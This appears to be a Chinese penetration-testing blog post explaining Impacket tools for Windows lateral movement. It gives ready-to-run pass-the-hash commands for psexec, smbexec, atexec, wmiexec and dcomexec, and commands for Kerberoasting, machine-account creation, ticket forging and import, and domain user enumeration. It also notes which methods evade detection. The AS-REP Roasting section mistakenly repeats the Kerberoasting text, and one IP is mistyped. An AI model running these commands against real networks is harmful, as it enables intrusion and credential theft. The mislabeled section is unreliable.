post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为南京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>南京</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://orangey1.github.io/posts/79bde3c4.html"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><a href="/tags/impacket/" tabindex="-1" itemprop="url">impacket</a><h1 id="CrawlerTitle" itemprop="name headline">impacket工具的使用</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Lark</span><time itemprop="dateCreated datePublished" datetime="2022-09-01T04:00:00.000Z" title="发表于 2022-09-01 12:00:00">2022-09-01</time><time itemprop="dateCreated datePublished" datetime="2026-03-24T05:16:04.800Z" title="更新于 2026-03-24 13:16:04">2026-03-24</time></header><p>在渗透测试中，横向移动（Lateral Movement）是指攻击者在获得一个系统的控制权限后，通过网络进一步渗透到其他系统的过程。Impacket 是一款强大的渗透测试工具集，提供了多种实现横向渗透的脚本，常见的工具包括 psexec.py、smbexec.py、atexec.py、dcomexec.py 和 wmiexec.py。尽管这些工具都可以执行远程命令，但它们在工作原理、依赖的服务以及使用条件上有显著差异。</p>
+<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">py版本</a><br><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">exe版本</a> </p>
+<h1 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py 是 Impacket 中非常经典的工具，仿照了 Microsoft 的 PsExec 工具。它通过 SMB（Server Message Block）协议和 RPC（远程过程调用）服务实现远程命令执行。具体流程是，psexec.py 在目标主机上通过 SMB 上传一个可执行文件，然后利用 RPC 启动该文件作为服务，从而执行命令。</span><br></pre></td></tr></table></figure>
+
+<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. SMB连接：psexec.py首先尝试通过SMB协议连接到目标主机</span><br><span class="line">2. 文件上传：连接成功之后就会将一个可执行文件上传到目标系统的的共享文件夹（如ADMIN$）</span><br><span class="line">3. 服务启动：之后，psexec.py会利用RPC启动该服务，从而在目标系统上执行远程命令</span><br></pre></td></tr></table></figure>
+<h2 id="依赖服务"><a href="#依赖服务" class="headerlink" title="依赖服务"></a>依赖服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SMB服务：需要目标主机开放SMB服务（通常是TCP 445）</span><br><span class="line">2. RPC服务：依赖于RPC（远程过程调用）来启动服务</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口需求"><a href="#端口需求" class="headerlink" title="端口需求"></a>端口需求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. TCP 445：用于SMB通信，这是psexec.py的核心端口</span><br><span class="line">2. TCP 139：在早期的SMB版本中，可能使用这个端口进行通信，但现代SMB使用TCP 445</span><br></pre></td></tr></table></figure>
+
+<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 优点：操作简单，且不依赖于目标主机上的额外服务，只要SMB和RPC可用即可。且以管理员权限登录后直接以SYSTEM权限执行命令</span><br><span class="line">2. 缺点：容易被防火墙和入侵检测系统检测到，因为文件上传和服务启动的行为很容易暴露。尤其是在目标环境中开启了SMB端口的安全监控时，攻击行为会被察觉</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令示例"><a href="#命令示例" class="headerlink" title="命令示例"></a>命令示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator@ip -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br><span class="line">（hash的值，冒号用来分隔LM-hash和NT-hash，冒号前为空表示未提供明文密码，-codec gbk指定编码方式为GBK，用于处理中文输出，以免出现乱码）</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-port [destination port] 指定目标SMB的端口</span><br><span class="line">-codec codec 目标回显的编码，可先执行chcp.com拿到回显编码</span><br><span class="line">-service-name service_name 指定创建服务的名称，默认随机</span><br><span class="line">-remote-binary-name remote_binary_name 指定上传文件的名称，默认随机</span><br></pre></td></tr></table></figure>
+
+<h1 id="smbexec-py"><a href="#smbexec-py" class="headerlink" title="smbexec.py"></a>smbexec.py</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>smbexec.py 是 Impacket 中的另一个工具，功能与 psexec.py 相似，但工作方式略有不同。它同样依赖于 SMB 协议来执行远程命令，但与 psexec.py 不同，smbexec.py 不需要上传可执行文件。相反，它利用共享资源（如 ADMIN$ 或 C$）直接在目标主机上执行命令。这使得 smbexec.py 相比 psexec.py 更加隐蔽。</p>
+<h2 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. SMB连接：smbexec.py通过SMB协议连接到目标系统</span><br><span class="line">2. 共享资源：连接成功可用通过目标主机上的共享资源（如ADMIN$或C$）来执行命令</span><br><span class="line">3. 远程命令执行：命令通过SMB共享直接在目标系统上执行，而不需要上传任何可执行文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="依赖服务-1"><a href="#依赖服务-1" class="headerlink" title="依赖服务"></a>依赖服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SMB服务：smbexec完全依赖于SMB服务来实现命令执行</span><br><span class="line">2. 无RPC服务依赖：与psexec.py服务不同，smbexec.py不依赖于RPC服务来启动进程或服务</span><br></pre></td></tr></table></figure>
+<h2 id="端口需求-1"><a href="#端口需求-1" class="headerlink" title="端口需求"></a>端口需求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. TCP 445：同样需要通过TCP 445端口进行SMB通信</span><br><span class="line">2. TCp 139：在某些情况下，如果目标系统使用较旧的SMB协议，可能还会使用TCP 139</span><br></pre></td></tr></table></figure>
+<h2 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 优点：相比psexec.py，smbexec.py不需要上传文件，减少了被检测到风险。它利用现有的共享资源直接执行命令，这使得攻击行为更加隐蔽</span><br><span class="line">2. 缺点：依赖目标系统的共享权限。如果目标系统的共享权限配置严格，可能无法成功执行命令。此外，某些安全工具可能会对共享资源的异常访问进行监控</span><br></pre></td></tr></table></figure>
+<h2 id="命令示例-1"><a href="#命令示例-1" class="headerlink" title="命令示例"></a>命令示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator@ip -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>
+<h2 id="常用选项-1"><a href="#常用选项-1" class="headerlink" title="常用选项"></a>常用选项</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-share SHARE 自定义回显的共享路径，默认为C$</span><br><span class="line">-mode &#123;SHARE,SERVER&#125; 设置SHARE回显或者SERVER回显，SERVER回显需要root linux</span><br><span class="line">-shell-type &#123;cmd,powershell&#125; 设置返回的Shell类型</span><br></pre></td></tr></table></figure>
+
+<h1 id="atexec-py"><a href="#atexec-py" class="headerlink" title="atexec.py"></a>atexec.py</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>atexec.py 是另一个用于远程执行命令的工具，但它与 psexec.py 和 smbexec.py 的工作原理有所不同。它通过 Windows 的任务计划程序（Task Scheduler）服务来执行命令。atexec.py 将命令作为计划任务添加到目标机器中，然后立即执行。</p>
+<h2 id="工作原理-2"><a href="#工作原理-2" class="headerlink" title="工作原理"></a>工作原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 任务计划程序：atexec.py将命令注册为计划任务</span><br><span class="line">2. 立即执行：任务一旦添加到目标系统中，会立即启动执行命令</span><br></pre></td></tr></table></figure>
+<h2 id="依赖服务-2"><a href="#依赖服务-2" class="headerlink" title="依赖服务"></a>依赖服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SMB服务：需要通过SMB协议与目标主机建立连接</span><br><span class="line">2. RPC服务：需要RPC服务来与目标系统的任务计划服务进行交互</span><br></pre></td></tr></table></figure>
+<h2 id="端口请求"><a href="#端口请求" class="headerlink" title="端口请求"></a>端口请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. TCP 445和TCP 135：需要通过这些端口与目标主机的SMB和RPC服务进行通信</span><br></pre></td></tr></table></figure>
+<h2 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 优点：任务计划程序是Windows系统中常用的工具，执行命令的过程相对隐蔽，且不需要上传额外的文件</span><br><span class="line">2. 缺点：需要目标系统的任务调度服务可用，而且某些目标系统可能会对计划任务进行严格的安全控制</span><br></pre></td></tr></table></figure>
+<h2 id="命令示例-2"><a href="#命令示例-2" class="headerlink" title="命令示例"></a>命令示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-atexec administrator@ip -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>
+<h2 id="常用选项-2"><a href="#常用选项-2" class="headerlink" title="常用选项"></a>常用选项</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-session-id SESSION_ID 使用登录的SESSION运行（无回显，不会主动调用cmd如silentcommand）</span><br><span class="line">-silentcommand 不运行cmd.exe，直接运行命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p><code>wmiexec.py</code> 是通过 Windows 管理工具（WMI）来执行远程命令的工具。WMI 是 Windows 系统的强大管理工具，允许管理员和攻击者远程管理系统。<code>wmiexec.py</code> 利用 WMI 来执行命令，是一种极为隐蔽的渗透工具。</p>
+<h2 id="工作原理-3"><a href="#工作原理-3" class="headerlink" title="工作原理"></a>工作原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. WMI协议：通过WMI协议执行命令，不需要上传可执行文件</span><br><span class="line">2. 远程命令：命令通过WMI在目标主机上执行，避免了传统的文件上传和服务创建</span><br></pre></td></tr></table></figure>
+<h2 id="依赖服务-3"><a href="#依赖服务-3" class="headerlink" title="依赖服务"></a>依赖服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. WMI服务：需要目标系统启用WMI服务</span><br><span class="line">2. RPC服务：需要通过RPC与目标系统进行通信</span><br></pre></td></tr></table></figure>
+<h2 id="端口需求-2"><a href="#端口需求-2" class="headerlink" title="端口需求"></a>端口需求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. TCP 445和TCP 135：用于与SMB和RPC服务进行通信</span><br><span class="line">2. 高端端口：WMI可能会使用动态分配的高端端口(49152-65535)</span><br></pre></td></tr></table></figure>
+<h2 id="优缺点-3"><a href="#优缺点-3" class="headerlink" title="优缺点"></a>优缺点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 优点：非常隐蔽，不容易被防火墙或入侵检测系统检测到</span><br><span class="line">2. 缺点：需要目标系统启用WMI服务，并且某些配置可能限制远程命令执行</span><br></pre></td></tr></table></figure>
+<h2 id="命令示例-3"><a href="#命令示例-3" class="headerlink" title="命令示例"></a>命令示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec administrator@ip -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>
+<h2 id="常用选项-3"><a href="#常用选项-3" class="headerlink" title="常用选项"></a>常用选项</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-share SHARE 设置连接的共享路径，默认ADMIN$</span><br><span class="line">-nooutput 不获取输出，没有SMB连接</span><br><span class="line">-silentcommand 不运行cmd.exe，直接运行命令</span><br><span class="line">-shell-type &#123;cmd,powershell&#125; 设置返回的Shell类型</span><br><span class="line">-com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本</span><br></pre></td></tr></table></figure>
+
+<h1 id="dcomexec-py"><a href="#dcomexec-py" class="headerlink" title="dcomexec.py"></a>dcomexec.py</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><p><code>dcomexec.py</code> 是通过 DCOM（分布式组件对象模型）协议进行远程命令执行的工具。它使用已注册的 DCOM 应用程序（如 <code>MMC20.Application</code> 或 <code>ShellWindows</code>）来执行命令。由于 DCOM 协议较少用于渗透测试，它的攻击行为更难被发现。</p>
+<h2 id="工作原理-4"><a href="#工作原理-4" class="headerlink" title="工作原理"></a>工作原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DCOM协议：dcomexec.py通过DCOM协议与目标主机建立连接，并利用已注册的DCOM应用程序执行命令</span><br></pre></td></tr></table></figure>
+<h2 id="依赖服务-4"><a href="#依赖服务-4" class="headerlink" title="依赖服务"></a>依赖服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. DCOM服务：需要目标系统启用DCO吗服务</span><br><span class="line">2. RPC服务：需要RPC与目标系统进行通信</span><br></pre></td></tr></table></figure>
+<h2 id="端口需求-3"><a href="#端口需求-3" class="headerlink" title="端口需求"></a>端口需求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. TCP 445和TCP 135：需要这两个端口来与目标主机的SMB和RPC服务进行通信</span><br><span class="line">2. 高端端口：DCOM可能会使用动态分配的高端端口(49152-65535)进行通信</span><br></pre></td></tr></table></figure>
+<h2 id="优缺点-4"><a href="#优缺点-4" class="headerlink" title="优缺点"></a>优缺点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 优点：DCOM协议较为隐蔽，不容易被传统防火墙或入侵检测系统检测到</span><br><span class="line">2. 缺点：依赖于DCOM服务，且目标系统可能会有防御措施</span><br></pre></td></tr></table></figure>
+<h2 id="命令示例-4"><a href="#命令示例-4" class="headerlink" title="命令示例"></a>命令示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dcomexec -object MMC20 administrator@ip -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>
+<h2 id="常用选项-4"><a href="#常用选项-4" class="headerlink" title="常用选项"></a>常用选项</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-share SHARE 设置连接的共享路径，默认ADMIN$</span><br><span class="line">-nooutput 不获取输出，没有SMB连接</span><br><span class="line">-object [&#123;ShellWindows,ShellBrowserWindow,MMC20&#125;] 设置RCE利用的类型</span><br><span class="line">-com-version MAJOR_VERSION:MINOR_VERSION 设置DCOM版本</span><br><span class="line">-shell-type &#123;cmd,powershell&#125; 设置返回的Shell类型</span><br><span class="line">-silentcommand 不运行cmd.exe，直接运行命令</span><br></pre></td></tr></table></figure>
+<h1 id="GetNPUsers-py（AS-REP-Roasting）"><a href="#GetNPUsers-py（AS-REP-Roasting）" class="headerlink" title="GetNPUsers.py（AS-REP Roasting）"></a>GetNPUsers.py（AS-REP Roasting）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py脚本可以在域外查询指定域的SPN(用户请求服务票据)，需要提供域账号和密码。</span><br><span class="line">查询hack用户下的SPN</span><br><span class="line">GetUserSPNs.py -dc-ip 10.211.55.4 test.com/hack:Password123</span><br><span class="line">将hack用户下所有的SPN的ST保存到hash.txt可以用hashcat进行破解。</span><br><span class="line">GetUserSPNs.py -request -dc-ip 10.211.55.4 test.com/hack:Password123 -outputfile hash.txt</span><br><span class="line">使用hack用户下将test用户下所有的SPN的ST保存到hash.txt可以用hashcat进行破解。</span><br><span class="line">GetUserSPNs.py -request -dc-ip 10.211.55.4 test.com/hack:Password123 -outputfile hash.txt -request-user test</span><br></pre></td></tr></table></figure>
+
+<h1 id="GetUserSPNs-py（Kerberoasting）"><a href="#GetUserSPNs-py（Kerberoasting）" class="headerlink" title="GetUserSPNs.py（Kerberoasting）"></a>GetUserSPNs.py（Kerberoasting）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py脚本可以在域外查询指定域的SPN，需要提供域账号和密码。</span><br><span class="line">查询hack用户下的SPN</span><br><span class="line">GetUserSPNs.py -dc-ip 10.211.55.4 test.com/hack:Password123</span><br><span class="line">将hack用户下所有的SPN的ST保存到hash.txt可以用hashcat进行破解。</span><br><span class="line">GetUserSPNs.py -request -dc-ip 10.211.55.4 test.com/hack:Password123 -outputfile hash.txt</span><br><span class="line">使用hack用户下将test用户下所有的SPN的ST保存到hash.txt可以用hashcat进行破解。</span><br><span class="line">GetUserSPNs.py -request -dc-ip 10.211.55.4 test.com/hack:Password123 -outputfile hash.txt -request-user test</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="addcomputer-py（增加机器账号"><a href="#addcomputer-py（增加机器账号" class="headerlink" title="addcomputer.py（增加机器账号)"></a>addcomputer.py（增加机器账号)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">进行基于资源约束委派攻击的时候需要一个机器账号进行控制,于是使用该脚本可以创建一个机器账号,使用时需要一个有效的域用户,支持两种方式创建一种是</span><br><span class="line">SAMR协议,另一种是LDAPS协议。</span><br><span class="line">SAMR协议创建机器账号:</span><br><span class="line">	addcomputer.py -computer-name &#x27;mmm123&#x27; -computer-pass &#x27;password123&#x27; -dc-ip 10.211.55.4 &#x27;test.com/hack:Password1234&#x27; -method SAMR -debug</span><br><span class="line">LDAPS协议创建机器账号:</span><br><span class="line">	addcomputer.py -computer-name &#x27;mmm123&#x27; -computer-pass &#x27;password123&#x27; -dc-ip 10.211.55.4 &#x27;test.com/hack:Password1234&#x27; -method LDAPS -debug</span><br><span class="line">修改已经创建的机器账号密码(添加-no-add参数):</span><br><span class="line">	addcomputer.py -computer-name &#x27;mmm123$&#x27; -computer-pass &#x27;newPassword123&#x27; -dc-ip 10.211.55.4 &#x27;test.com/hack:Password123&#x27; -method SAMR -debug -no-add</span><br></pre></td></tr></table></figure>
+<h1 id="getST-py-请求ST）"><a href="#getST-py-请求ST）" class="headerlink" title="getST.py(请求ST）"></a>getST.py(请求ST）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">getST.py -dc-ip 10.211.55.4 -spn cifs/WIN-VJ3RFUO09V9.test.com test.com/administrator:Password123</span><br><span class="line">导入票据:</span><br><span class="line">	export KRB5CCNAME=administrator.ccache</span><br><span class="line">访问该服务:</span><br><span class="line">	smbexec.py -no-pass -k WIN-VJ3RFUO09V9.test.com -dc-ip 10.211.55.4</span><br><span class="line">使用上一步使用getTGT.py生成的TGT票据指定SPN的ST</span><br><span class="line">	导入票据</span><br><span class="line">	export KRB5CCNAME=administrator@10.211.55.4.ccache</span><br><span class="line">	生成新的票据</span><br><span class="line">	getST.py -k -no-pass -spn cifs/WIN-VJ3RFUO09V9.test.com -dc-ip 10.211.55.4 test/administrator@10.211.5.4</span><br><span class="line">	导入票据</span><br><span class="line">	export KRB5CCNAME=administrator@10.211.55.4.ccache</span><br><span class="line">	访问指定服务</span><br><span class="line">	smbexec.py -no-pass -k WIN-VJ3RFUO09V9.test.com -dc-ip 10.211.55.4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="samrdump-py-枚举域内用户"><a href="#samrdump-py-枚举域内用户" class="headerlink" title="samrdump.py(枚举域内用户)"></a>samrdump.py(枚举域内用户)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">samrdump.py test/administrator:Password123@10.211.55.4 -csv</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="ticketConverter-py-票据转换"><a href="#ticketConverter-py-票据转换" class="headerlink" title="ticketConverter.py(票据转换)"></a>ticketConverter.py(票据转换)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以将.ccache和.kirbi格式的票据进行相互转换。</span><br><span class="line">ticketConverter.py hack.ccache hack.kirbi</span><br><span class="line">ticketConverter.py hack.kirbi hack.ccache</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/108253531">CSDN-impacket的使用总结</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79518550/article/details/145849292">Impacket工具中的横向渗透利器及其使用场景对比详解</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11323">Impacket脚本利用指南</a> </p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="/img/avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="/img/avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">Lark</div><div class="post-copyright__author_desc">Lark</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://orangey1.github.io/posts/79bde3c4.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://orangey1.github.io/posts/79bde3c4.html')">impacket工具的使用</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://orangey1.github.io/posts/79bde3c4.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=impacket工具的使用&amp;url=https://orangey1.github.io/posts/79bde3c4.html&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://orangey1.github.io" target="_blank">Lark's Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">59</span></a><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">62</span></a><a class="post-meta__box__tags" href="/tags/impacket/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>impacket<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/93a3786f.html"><img class="next-cover" src="/img/file-20250603192924499.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Time靶场渗透记录</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 